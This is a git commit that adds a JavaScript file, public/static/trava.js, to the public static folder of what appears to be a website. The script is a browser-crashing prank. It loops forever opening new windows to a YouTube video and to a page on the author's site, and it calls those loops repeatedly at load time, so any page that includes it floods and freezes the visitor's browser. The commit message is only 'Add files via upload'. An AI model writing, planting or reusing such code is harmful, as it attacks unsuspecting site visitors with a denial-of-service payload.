e0daf036dd6aa17f55604952eac04a12118cf3b2
Victor Xavier <64893304+Diamate1@users.noreply.github.com>
2021-05-26 14:11:48 -0300

    Add files via upload

---
+++ public/static/trava.js
@@ -0,0 +1,31 @@
+async function kkk() {
+    while (1) {
+        open('https://www.youtube.com/watch?v=kQ3PqoIQXIk')
+    }
+}
+
+async function aaa() {
+    while (1) {
+        open('http://diamate1.vercel.app/lipenga')
+    }
+}
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
+aaa()
+kkk()
